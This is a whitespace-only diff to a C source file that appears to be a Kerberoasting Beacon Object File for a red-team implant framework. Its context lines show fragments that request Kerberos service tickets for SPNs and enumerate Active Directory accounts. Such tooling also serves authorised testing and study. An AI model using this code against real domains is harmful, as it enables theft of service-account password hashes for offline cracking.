@@ -1,4 +1,4 @@
-#define SECURITY_WIN32 
+#define SECURITY_WIN32
 
 #include <windows.h>
 #include <activeds.h>
@@ -63,7 +63,7 @@ VOID BeaconOutputStreamW() {
 			goto CleanUp;
 		}
 
-		if (FAILED(lpStream->lpVtbl->Read(lpStream, lpwOutput, (ULONG)cbSize, &cbRead))) {		
+		if (FAILED(lpStream->lpVtbl->Read(lpStream, lpwOutput, (ULONG)cbSize, &cbRead))) {
 			goto CleanUp;
 		}
 
@@ -87,7 +87,7 @@ CleanUp:
 void GetFormattedErrMsg(_In_ HRESULT hr) {
     LPWSTR lpwErrorMsg = NULL;
 
-    KERNEL32$FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS,  
+    KERNEL32$FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS,
 	NULL,
 	(DWORD)hr,
 	MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
@@ -142,7 +142,7 @@ LPSTR Roast(_In_ LPWSTR pszSPN) {
 	CredHandle hCredential;
 	TimeStamp tsExpiry;
 	SECURITY_STATUS Status = SECUR32$AcquireCredentialsHandleW(
-		NULL, 
+		NULL,
 		MICROSOFT_KERBEROS_NAME,
 		SECPKG_CRED_OUTBOUND,
 		NULL, NULL,
@@ -159,7 +159,7 @@ LPSTR Roast(_In_ LPWSTR pszSPN) {
 		SECUR32$FreeCredentialsHandle(&hCredential);
 		goto CleanUp;
 	}
-	
+
 	CtxtHandle hContext;
 	SecBuffer secBuf = { MAXTOKENSIZE, SECBUFFER_TOKEN, pTicketBuf };
 	SecBufferDesc secBufDec = { SECBUFFER_VERSION, 1, &secBuf };
@@ -169,7 +169,7 @@ LPSTR Roast(_In_ LPWSTR pszSPN) {
 
 	// Initiate outbound security context from credential handle to acquire a token.
 	Status = SECUR32$InitializeSecurityContextW(
-		&hCredential, 
+		&hCredential,
 		NULL,
 		(PSECURITY_STRING)pszSPN,
 		ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH,
@@ -274,7 +274,7 @@ HRESULT FindSPNs(_In_ IDirectorySearch *pContainerToSearch, _In_ BOOL bListSPNs,
 		goto CleanUp;
 	}
 
-	if (SUCCEEDED(hr)) {	
+	if (SUCCEEDED(hr)) {
 		// Call IDirectorySearch::GetNextRow() to retrieve the next row of data.
 		hr = pContainerToSearch->lpVtbl->GetFirstRow(pContainerToSearch, hSearch);
 		if (SUCCEEDED(hr)) {
@@ -436,7 +436,7 @@ HRESULT FindSPNs(_In_ IDirectorySearch *pContainerToSearch, _In_ BOOL bListSPNs,
 				if (MSVCRT$_wcsicmp(pUserInfo->chServicePrincipalName[0], L"") != 0) {
 					bResult = TRUE;
 					BeaconPrintToStreamW(L"[*] sAMAccountName\t: %ls\n", pUserInfo->chSamAccountName);
-					BeaconPrintToStreamW(L"[*] description\t\t: %ls\n", pUserInfo->chDescription); 
+					BeaconPrintToStreamW(L"[*] description\t\t: %ls\n", pUserInfo->chDescription);
 					BeaconPrintToStreamW(L"[*] distinguishedName\t: %ls\n", pUserInfo->chDistinguishedName);
 					BeaconPrintToStreamW(L"[*] whenCreated\t\t: %ls\n", pUserInfo->chWhenCreated);
 					BeaconPrintToStreamW(L"[*] whenChanged\t\t: %ls\n", pUserInfo->chWhenChanged);
@@ -499,7 +499,7 @@ HRESULT FindSPNs(_In_ IDirectorySearch *pContainerToSearch, _In_ BOOL bListSPNs,
 	}
 
 CleanUp:
-	
+
 	if (pUserInfo != NULL) {
 		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pUserInfo);
 	}
